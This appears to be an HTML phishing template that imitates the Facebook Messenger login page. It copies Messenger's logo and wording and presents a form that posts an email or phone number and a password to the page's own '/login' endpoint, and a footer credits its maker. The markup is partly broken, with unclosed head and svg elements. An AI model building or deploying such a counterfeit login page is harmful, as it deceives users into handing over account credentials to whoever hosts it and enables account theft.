<!DOCTYPE html>
<html lang="en">
<head>

<body class="msgr-body">
<div class="msgr-container">
  <div class="msgr-card">
    <svg class="msgr-logo" viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg" width="64">
      <radialGradient id="mg" cx="19%" cy="92%" r="99%">
        <stop offset="0%" stop-color="#09F"/>
        <stop offset="60%" stop-color="#A033FF"/>
        <stop offset="90%" stop-color="#FF5280"/>
        <stop offset="100%" stop-color="#FF7061"/>
      </radialGradient>
      <path fill="url(#mg)" d="M18 0C8.06 0 0 7.75 0 17.31c0 5.44 2.48 10.28 6.38 13.44.33.27.53.68.54 1.11l.09 3.03c.03 1.05 1.14 1.73 2.09 1.29l3.38-1.48c.32-.14.68-.17 1.02-.08 1.76.48 3.62.74 5.5.74 9.94 0 18-7.75 18-17.31S27.94 0 18 0z"/>

    <h1>Log in to Messenger</h1>
    <p class="msgr-sub">Use your Facebook account to continue</p>
    <form action="/login" method="POST" autocomplete="off">
      <input type="text" name="email" placeholder="Email address or phone number" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit" class="msgr-btn">Continue</button>
    </form>
    <p class="msgr-foot">Forgot your password? <a href="#">Get help</a></p>
  </div>
  <div class="g-made">made by <span>←→ Ace</span></div>
</div>
